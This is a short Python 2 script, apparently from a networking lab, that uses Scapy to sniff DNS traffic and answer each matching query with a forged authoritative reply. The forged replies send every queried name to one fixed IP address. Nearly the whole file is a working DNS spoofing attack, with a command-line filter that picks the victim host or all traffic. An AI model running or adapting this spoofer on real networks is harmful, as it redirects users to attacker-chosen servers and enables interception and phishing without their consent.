from scapy.all import *

class entier:
    def __init__(self):
        self.val = 0
    def inc(self):
        self.val += 1
i = entier()

"""paquet = sr1(IP(dst='129.104.201.51')/UDP()/DNS(rd=1,qd=DNSQR(qname='radius.polytechnique.fr')))
paquet[IP].src='0.0.0.0'
paquet[IP].dst='0.0.0.0'
paquet[DNS].an[0].rrname='salut.org'
paquet[DNS].an[0].rdata='0.0.0.0'"""
ip_autorite = '1.1.1.1' # change me

def maFonction(a):
    i.inc()
    msg = str(i.val) + ': ' + a[IP].src + ' -> ' + a[IP].dst
    if (a[DNS].qr==0L) and ((a[IP].src == filtre) or (a[IP].dst == filtre) or (filtre == '-a')):
        msg = msg + ' <-- REQUEST for ' + a[DNS].qd[0].qname
        print msg
        spoofed_pkt = IP(dst=a[IP].src, src=a[IP].dst)/\
                      UDP(dport=a[UDP].sport, sport=a[UDP].dport)/\
                      DNS(id=a[DNS].id, qd=a[DNS].qd, aa = 1, qr=1, \
                      an=DNSRR(rrname=a[DNS].qd.qname,  ttl=10, rdata='129.104.221.35'))
        send(spoofed_pkt)

    if (a[DNS].qr==1L) and ((a[IP].src == filtre) or (a[IP].dst == filtre) or (filtre == '-a')):
        msg = msg + ' <-- ANSWER: ' + a[DNS].an[0].rdata
        print msg

        
def monFiltre(x):
    return (x.haslayer(DNS))# and (x[DNS].qr==0L)
    

filtre = sys.argv[1]
sniff(count = 1000,lfilter = monFiltre,prn = maFonction, timeout = 60)
